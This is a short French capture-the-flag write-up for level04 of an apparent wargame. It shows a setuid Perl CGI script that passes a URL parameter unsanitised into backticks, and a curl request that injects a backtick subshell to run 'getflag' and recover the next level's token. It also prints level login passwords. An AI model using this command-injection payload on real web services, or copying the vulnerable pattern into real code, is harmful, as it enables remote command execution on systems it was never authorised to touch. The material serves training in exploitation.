# Level04

> login:password -> *`level04:qi0maab88jeaj46qoumi7maus`*
```
:~$ su level04
Password:qi0maab88jeaj46qoumi7maus
```
---

```
:~$ pwd
/home/user/level04
```

```
:~$ ls -la
...
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
...
```

Le Home posséde un script perl level04.pl

```
:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Le script affiche la valeur du parametre "x" sur le port `:4747`.
On peut donc injecter un subshell pour que son echo affiche le resultat

```
:~$ curl localhost:4747?x=toto
toto

:~$ curl 'localhost:4747?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

Le flag nous permet de se connecter au level05
`level05:ne2searoevaevoem4ov4ar8ap`

> Tools:
> - https://unix.stackexchange.com/questions/138463/do-parentheses-really-put-the-command-in-a-subshell